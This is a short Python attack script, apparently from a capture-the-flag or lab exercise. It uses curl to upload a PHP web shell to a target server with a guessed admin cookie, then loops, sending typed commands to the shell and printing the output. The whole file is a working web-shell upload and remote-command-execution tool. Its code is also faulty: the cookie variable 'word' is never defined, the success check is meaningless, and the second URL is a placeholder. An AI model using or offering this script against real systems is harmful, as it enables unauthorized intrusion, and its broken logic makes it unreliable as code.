"""
-----------------------------------------------------------
This code was developed by veilwr4ith                     |
Shell Payload                                             |
-----------------------------------------------------------
"""
import os
import requests

alphabet = input("Enter the letter: ")
"""
Construct a command using cURL to upload the PHP shell to the target server
"""
"""
Attempting to upload a PHP shell to a arget server by sending POST requests with a cookie parameter containing a generated word from a wordlist file. 
Once uploaded, it enters a loop to continuously execute commands on the target server by sending GET requests to the PHP shell with the command as a parameter.
"""
command = (
    f"curl -k -F 'file=@./shell.php' "  # Upload shell.php file
    f"-F 'secure=val1d' --cookie 'admin=cookie{word}' "  # Add a cookie parameter with the generated word
    "http://10.0.0.52/ajax.php"  # Target URL for the upload
)

"""
Execute the constructed command in the shell
"""
os.system(command)

"""
Print the command being executed
"""
print(command)

"""
Check if the command contains "1" (This is probably a conditional error, but it's hard to tell without context)
"""
if "1" in command:
    """
    If "1" is found, print that the shell has been uploaded
    """
    print("[+] Shell has been uploaded!")

    """
    Enter a loop to continuously prompt for commands to execute on the target server
    """
    while True:
        """
        Prompt for a command to execute
        """
        execute_command = input("momentum@playground:~> ")

        """
        Send a GET request to the shell.php file on the target server with the command as a parameter
        """
        get_rce = requests.get(
            f"http://ip/owls/shell.php?cmd={execute_command}"
        )
        """
        Print the response content (the output of the executed command)
        """
        print(str(get_rce.content))

        """
        If the entered command is "clear", clear the screen
        """
        if execute_command == "clear":
            os.system("clear")
